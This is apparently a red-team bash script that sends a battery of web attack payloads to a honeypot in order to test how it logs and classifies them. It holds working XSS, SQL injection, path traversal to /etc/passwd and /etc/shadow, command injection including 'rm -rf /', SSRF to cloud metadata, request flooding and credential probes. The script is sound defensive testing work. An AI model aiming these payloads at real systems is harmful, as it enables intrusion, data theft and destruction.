#!/bin/bash
# red-team-attacks.sh
# Red Team Attack Scenarios for Honeypot Testing
#
# This script runs various attack patterns against the honeypot
# to test its ability to capture and classify attacks.
#
# Author: Strategickhaos Red Team
# Purpose: Offensive security testing and attack pattern generation

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Default honeypot URL (can be overridden)
HONEYPOT="${HONEYPOT_URL:-http://localhost:8080}"
DELAY="${ATTACK_DELAY:-0.5}"  # Delay between attacks

echo -e "${RED}🔴 RED TEAM: ATTACK SCENARIOS${NC}"
echo "=============================="
echo ""
echo -e "Target: ${CYAN}$HONEYPOT${NC}"
echo ""

# Track attack count
ATTACK_COUNT=0
SUCCESS_COUNT=0
FAILURE_COUNT=0

# Helper function to run attack
run_attack() {
    local name="$1"
    local description="$2"
    shift 2
    
    ATTACK_COUNT=$((ATTACK_COUNT + 1))
    echo -e "${YELLOW}[$ATTACK_COUNT] $name${NC}"
    echo -e "    ${description}"
    
    if "$@" > /tmp/attack_response.txt 2>&1; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        echo -e "    ${GREEN}✓ Attack executed${NC}"
    else
        FAILURE_COUNT=$((FAILURE_COUNT + 1))
        echo -e "    ${RED}✗ Attack failed to execute${NC}"
    fi
    
    sleep "$DELAY"
    echo ""
}

# ============================================
# ATTACK 1: No Authentication Bypass
# ============================================
run_attack "Unauthenticated Access" \
    "Testing access without any authentication" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"message": "Red team was here - no auth"}'

# ============================================
# ATTACK 2: XSS Injection
# ============================================
run_attack "XSS Injection" \
    "Attempting Cross-Site Scripting attack" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"message": "<script>alert(\"pwned\")</script>"}'

run_attack "XSS via IMG tag" \
    "Attempting XSS via image onerror" \
    curl -s -X POST "$HONEYPOT/signals/github" \
    -H "Content-Type: application/json" \
    -d '{"message": "<img src=x onerror=alert(1)>"}'

run_attack "XSS via SVG" \
    "Attempting XSS via SVG element" \
    curl -s -X POST "$HONEYPOT/signals/financial" \
    -H "Content-Type: application/json" \
    -d '{"message": "<svg onload=alert(1)>"}'

# ============================================
# ATTACK 3: SQL Injection
# ============================================
run_attack "SQL Injection (Basic)" \
    "Attempting basic SQL injection" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"message": "test\"; DROP TABLE users;--"}'

run_attack "SQL Injection (Union)" \
    "Attempting UNION-based SQL injection" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"id": "1 UNION SELECT username, password FROM users--"}'

run_attack "SQL Injection (Boolean)" \
    "Attempting boolean-based SQL injection" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"user": "admin'\'' OR '\''1'\''='\''1"}'

# ============================================
# ATTACK 4: Path Traversal
# ============================================
run_attack "Path Traversal (Basic)" \
    "Attempting to access /etc/passwd" \
    curl -s -X GET "$HONEYPOT/../../../etc/passwd"

run_attack "Path Traversal (URL Encoded)" \
    "Attempting URL-encoded path traversal" \
    curl -s -X GET "$HONEYPOT/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

run_attack "Path Traversal (Double Encoded)" \
    "Attempting double URL-encoded traversal" \
    curl -s -X GET "$HONEYPOT/%252e%252e/%252e%252e/etc/shadow"

# ============================================
# ATTACK 5: Rate Limit Testing (DoS)
# ============================================
run_attack "Rate Limit Test" \
    "Sending 50 rapid requests to test rate limiting" \
    bash -c 'for i in {1..50}; do
        curl -s -X POST "$HONEYPOT/signals/academic" \
            -H "Content-Type: application/json" \
            -d "{\"message\": \"flood $i\"}" &
    done; wait'

# ============================================
# ATTACK 6: HTTP Method Tampering
# ============================================
run_attack "Method Tampering (DELETE)" \
    "Attempting unauthorized DELETE request" \
    curl -s -X DELETE "$HONEYPOT/signals/academic"

run_attack "Method Tampering (PUT)" \
    "Attempting unauthorized PUT request" \
    curl -s -X PUT "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"message": "PUT method test"}'

run_attack "Method Tampering (PATCH)" \
    "Attempting unauthorized PATCH request" \
    curl -s -X PATCH "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"message": "PATCH method test"}'

# ============================================
# ATTACK 7: Header Injection
# ============================================
run_attack "Header Injection (Spoofed IP)" \
    "Attempting to spoof source IP via headers" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "X-Forwarded-For: 1.2.3.4" \
    -H "X-Real-IP: 5.6.7.8" \
    -H "Content-Type: application/json" \
    -d '{"message": "header injection test"}'

run_attack "Header Injection (Host Override)" \
    "Attempting to override Host header" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Host: evil.com" \
    -H "Content-Type: application/json" \
    -d '{"message": "host override test"}'

# ============================================
# ATTACK 8: Configuration Disclosure
# ============================================
run_attack "Config Disclosure (/config)" \
    "Attempting to access configuration endpoint" \
    curl -s -X GET "$HONEYPOT/config"

run_attack "Config Disclosure (/env)" \
    "Attempting to access environment variables" \
    curl -s -X GET "$HONEYPOT/env"

run_attack "Config Disclosure (/.env)" \
    "Attempting to access .env file" \
    curl -s -X GET "$HONEYPOT/.env"

run_attack "Config Disclosure (/debug)" \
    "Attempting to access debug endpoint" \
    curl -s -X GET "$HONEYPOT/debug"

# ============================================
# ATTACK 9: Command Injection
# ============================================
run_attack "Command Injection (Backticks)" \
    "Attempting command injection via backticks" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"message": "`id`"}'

run_attack "Command Injection (Pipe)" \
    "Attempting command injection via pipe" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"message": "test | cat /etc/passwd"}'

run_attack "Command Injection (Semicolon)" \
    "Attempting command injection via semicolon" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"message": "test; rm -rf /"}'

# ============================================
# ATTACK 10: SSRF Attempts
# ============================================
run_attack "SSRF (Localhost)" \
    "Attempting to access localhost via SSRF" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"url": "http://localhost:8080/admin"}'

run_attack "SSRF (Metadata)" \
    "Attempting to access cloud metadata service" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

run_attack "SSRF (Internal)" \
    "Attempting to access internal services" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d '{"url": "http://10.0.0.1:8080/internal"}'

# ============================================
# ATTACK 11: Credential Probing
# ============================================
run_attack "Credential Probe (Admin)" \
    "Attempting to access admin endpoint" \
    curl -s -X POST "$HONEYPOT/admin/login" \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "admin123"}'

run_attack "Credential Probe (Token)" \
    "Attempting to extract tokens" \
    curl -s -X GET "$HONEYPOT/api/token"

# ============================================
# ATTACK 12: Buffer Overflow Attempt
# ============================================
run_attack "Buffer Overflow" \
    "Sending oversized payload" \
    curl -s -X POST "$HONEYPOT/signals/academic" \
    -H "Content-Type: application/json" \
    -d "{\"message\": \"$(python3 -c 'print("A" * 50000)')\"}"

# ============================================
# RESULTS SUMMARY
# ============================================
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════${NC}"
echo -e "${RED}🔴 RED TEAM ATTACK SUMMARY${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════${NC}"
echo ""
echo -e "Total attacks executed: ${CYAN}$ATTACK_COUNT${NC}"
echo -e "Successful executions:  ${GREEN}$SUCCESS_COUNT${NC}"
echo -e "Failed executions:      ${RED}$FAILURE_COUNT${NC}"
echo ""

# Check honeytrap stats if available
if curl -s "$HONEYPOT/stats" > /tmp/stats.json 2>/dev/null; then
    echo -e "${PURPLE}📊 HONEYTRAP STATISTICS:${NC}"
    cat /tmp/stats.json | python3 -m json.tool 2>/dev/null || cat /tmp/stats.json
else
    echo -e "${YELLOW}⚠️  Could not retrieve honeytrap stats${NC}"
    echo -e "Check: kubectl logs -f deployment/honeytrap -n red-team-honeypot"
fi

echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════${NC}"
echo -e "${GREEN}🔥 RED TEAM COMPLETE${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════${NC}"
